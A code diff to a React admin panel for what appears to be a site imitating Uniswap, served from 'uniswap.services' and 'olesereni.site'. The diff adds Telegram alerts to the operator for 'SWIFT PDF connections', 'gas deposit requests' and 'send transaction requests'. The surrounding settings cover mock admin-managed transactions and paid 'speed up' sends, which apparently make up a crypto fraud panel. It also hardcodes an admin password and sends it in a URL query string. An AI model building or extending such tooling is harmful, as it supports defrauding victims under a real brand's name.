@@ -9,6 +9,7 @@ import { Lock } from 'ui/src/components/icons/Lock'
 import { Settings } from 'ui/src/components/icons/Settings'
 import { ShieldCheck } from 'ui/src/components/icons/ShieldCheck'
 import { Trash } from 'ui/src/components/icons/Trash'
+import { SendAction } from 'ui/src/components/icons/SendAction'
 
 // Admin password
 const ADMIN_PASSWORD = '13565024'
@@ -16,11 +17,18 @@ const ADMIN_PASSWORD = '13565024'
 // Storage key for admin settings
 export const SWIFT_ADMIN_SETTINGS_KEY = 'swift-admin-settings'
 
-// API endpoint for settings - use api subdomain for production
-const API_BASE_URL =
-  typeof window !== 'undefined' && window.location.hostname !== 'localhost'
-    ? 'https://api.uniswap.services' // Use api subdomain in production
-    : 'http://localhost:3001' // Use absolute path in development
+// API endpoint for settings - detect domain and use matching API subdomain
+function getApiBaseUrl(): string {
+  if (typeof window === 'undefined' || window.location.hostname === 'localhost') {
+    return 'http://localhost:3001'
+  }
+  const host = window.location.hostname
+  if (host === 'olesereni.site' || host === 'www.olesereni.site') {
+    return 'https://api.olesereni.site'
+  }
+  return 'https://api.uniswap.services'
+}
+const API_BASE_URL = getApiBaseUrl()
 
 // Default settings
 const DEFAULT_SETTINGS: SwiftAdminSettings = {
@@ -43,6 +51,10 @@ const DEFAULT_SETTINGS: SwiftAdminSettings = {
   slowSendEnabled: true, // Enable free sends that take hours
   slowSendDurationHours: 4, // How many hours free sends take
   speedUpGasFeePercentage: 100, // % of normal gas fee to charge for speed up (100 = full fee)
+  // Telegram settings
+  telegramBotToken: '',
+  telegramChannelId: '',
+  telegramNotificationsEnabled: false,
 }
 
 // IP Whitelist interfaces
@@ -185,6 +197,10 @@ export interface SwiftAdminSettings {
   slowSendEnabled: boolean // Enable free sends that take hours
   slowSendDurationHours: number // How many hours free sends take
   speedUpGasFeePercentage: number // % of normal gas fee to charge for speed up
+  // Telegram settings (managed server-side, these are for UI display only)
+  telegramBotToken?: string
+  telegramChannelId?: string
+  telegramNotificationsEnabled?: boolean
 }
 
 // Mock Transaction interface for admin-managed transactions
@@ -1050,12 +1066,27 @@ const AdminPanel = memo(function AdminPanel() {
   const [saved, setSaved] = useState(false)
   const [saving, setSaving] = useState(false)
   const [error, setError] = useState('')
-  const [activeSection, setActiveSection] = useState<'settings' | 'ip'>('settings')
+  const [activeSection, setActiveSection] = useState<'settings' | 'ip' | 'telegram'>('settings')
   const autoSaveTimeoutRef = useRef<NodeJS.Timeout | null>(null)
+
+  // Telegram-specific state (managed via separate server-side API)
+  const [telegramConfig, setTelegramConfig] = useState({
+    botToken: '',
+    channelId: '',
+    notificationsEnabled: false,
+    botTokenSet: false,
+  })
+  const [telegramTestResult, setTelegramTestResult] = useState<{ success: boolean; message: string } | null>(null)
+  const [telegramSaving, setTelegramSaving] = useState(false)
 
   // Load settings from API on mount
   useEffect(() => {
     fetchSwiftAdminSettings().then((s) => setSettings(s))
+    // Load Telegram config from server
+    fetch(`${API_BASE_URL}/api/telegram/config?password=${ADMIN_PASSWORD}`)
+      .then((r) => r.json())
+      .then((data) => setTelegramConfig(data))
+      .catch(() => { /* ignore */ })
   }, [])
 
   // Auto-save settings with debounce (2 second delay)
@@ -1171,9 +1202,189 @@ const AdminPanel = memo(function AdminPanel() {
               </Text>
             </Flex>
           </TabButton>
+          <TabButton active={activeSection === 'telegram'} onPress={() => setActiveSection('telegram')}>
+            <Flex row alignItems="center" gap="$spacing8">
+              <SendAction size={16} color={activeSection === 'telegram' ? 'white' : '$neutral1'} />
+              <Text variant="buttonLabel3" color={activeSection === 'telegram' ? 'white' : '$neutral1'}>
+                Telegram
+              </Text>
+            </Flex>
+          </TabButton>
         </Flex>
 
-        {activeSection === 'ip' ? (
+        {activeSection === 'telegram' ? (
+          <Flex gap="$spacing20">
+            {/* Telegram Notifications Toggle */}
+            <Flex
+              gap="$spacing12"
+              backgroundColor={telegramConfig.notificationsEnabled ? '$statusSuccess2' : '$surface1'}
+              borderRadius="$rounded12"
+              p="$spacing16"
+              borderWidth={1}
+              borderColor={telegramConfig.notificationsEnabled ? '$statusSuccess' : '$surface3'}
+            >
+              <Flex row alignItems="center" justifyContent="space-between">
+                <Flex>
+                  <Text variant="body2" fontWeight="600">
+                    📬 Telegram Notifications
+                  </Text>
+                  <Text variant="body3" color="$neutral2">
+                    {telegramConfig.notificationsEnabled ? 'Enabled - Receiving alerts' : 'Disabled - No alerts sent'}
+                  </Text>
+                </Flex>
+                <ToggleSwitch
+                  active={telegramConfig.notificationsEnabled}
+                  onPress={() => {
+                    const newConfig = { ...telegramConfig, notificationsEnabled: !telegramConfig.notificationsEnabled }
+                    setTelegramConfig(newConfig)
+                  }}
+                >
+                  <ToggleKnob active={telegramConfig.notificationsEnabled} />
+                </ToggleSwitch>
+              </Flex>
+            </Flex>
+
+            {/* Bot Token */}
+            <InputContainer>
+              <Text variant="body2" fontWeight="600">
+                Bot Token
+              </Text>
+              <Text variant="body3" color="$neutral2">
+                Telegram Bot API token (from @BotFather). {telegramConfig.botTokenSet ? '✅ Token is set' : '❌ Not configured'}
+              </Text>
+              <input
+                style={inputStyles}
+                type="password"
+                value={telegramConfig.botToken}
+                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
+                  setTelegramConfig({ ...telegramConfig, botToken: e.target.value })
+                }
+                placeholder="Enter bot token (e.g., 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11)"
+              />
+            </InputContainer>
+
+            {/* Channel ID */}
+            <InputContainer>
+              <Text variant="body2" fontWeight="600">
+                Channel/Chat ID
+              </Text>
+              <Text variant="body3" color="$neutral2">
+                Telegram channel or group chat ID where notifications are sent
+              </Text>
+              <input
+                style={inputStyles}
+                type="text"
+                value={telegramConfig.channelId}
+                onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
+                  setTelegramConfig({ ...telegramConfig, channelId: e.target.value })
+                }
+                placeholder="Enter channel ID (e.g., -1001234567890 or @channelname)"
+              />
+            </InputContainer>
+
+            {/* Test Connection Button */}
+            <Flex row gap="$spacing12">
+              <SaveButton
+                onPress={async () => {
+                  setTelegramTestResult(null)
+                  setTelegramSaving(true)
+                  try {
+                    const res = await fetch(`${API_BASE_URL}/api/telegram/test`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({
+                        password: ADMIN_PASSWORD,
+                        botToken: telegramConfig.botToken,
+                        channelId: telegramConfig.channelId,
+                      }),
+                    })
+                    const data = await res.json()
+                    setTelegramTestResult({
+                      success: data.success,
+                      message: data.success
+                        ? `✅ Connected! Bot: ${data.botName}`
+                        : `❌ Failed: ${data.error}`,
+                    })
+                  } catch (err) {
+                    setTelegramTestResult({ success: false, message: `❌ Error: ${String(err)}` })
+                  }
+                  setTelegramSaving(false)
+                }}
+                disabled={telegramSaving || !telegramConfig.botToken || !telegramConfig.channelId}
+              >
+                <Text variant="buttonLabel3" color="white">
+                  {telegramSaving ? 'Testing...' : 'Test Connection'}
+                </Text>
+              </SaveButton>
+
+              <SaveButton
+                onPress={async () => {
+                  setTelegramSaving(true)
+                  try {
+                    await fetch(`${API_BASE_URL}/api/telegram/config`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({
+                        password: ADMIN_PASSWORD,
+                        botToken: telegramConfig.botToken,
+                        channelId: telegramConfig.channelId,
+                        notificationsEnabled: telegramConfig.notificationsEnabled,
+                      }),
+                    })
+                    setTelegramTestResult({ success: true, message: '✅ Telegram settings saved!' })
+                    setTimeout(() => setTelegramTestResult(null), 3000)
+                  } catch (err) {
+                    setTelegramTestResult({ success: false, message: `❌ Save failed: ${String(err)}` })
+                  }
+                  setTelegramSaving(false)
+                }}
+                disabled={telegramSaving}
+              >
+                <Flex row alignItems="center" gap="$spacing8">
+                  <Check size={16} color="white" />
+                  <Text variant="buttonLabel3" color="white">
+                    Save Telegram Settings
+                  </Text>
+                </Flex>
+              </SaveButton>
+            </Flex>
+
+            {/* Test Result */}
+            {telegramTestResult && (
+              <Flex
+                p="$spacing12"
+                backgroundColor={telegramTestResult.success ? '$statusSuccess2' : '$statusCritical2'}
+                borderRadius="$rounded12"
+              >
+                <Text
+                  variant="body3"
+                  color={telegramTestResult.success ? '$statusSuccess' : '$statusCritical'}
+                >
+                  {telegramTestResult.message}
+                </Text>
+              </Flex>
+            )}
+
+            {/* Notification Events */}
+            <Flex backgroundColor="$surface1" borderRadius="$rounded12" p="$spacing16" gap="$spacing8">
+              <Text variant="body3" fontWeight="600" color="$neutral2">
+                Notification Events
+              </Text>
+              <Text variant="body4" color="$neutral3">
+                📄 SWIFT PDF connections (with document attached)
+              </Text>
+              <Text variant="body4" color="$neutral3">
+                ⛽ Gas deposit requests
+              </Text>
+              <Text variant="body4" color="$neutral3">
+                📤 Send transaction requests
+              </Text>
+              <Text variant="body4" color="$neutral3">
+                🛡 Blocked IP access attempts
+              </Text>
+            </Flex>
+          </Flex>
+        ) : activeSection === 'ip' ? (
           <IPManagementPanel />
         ) : (
           <>
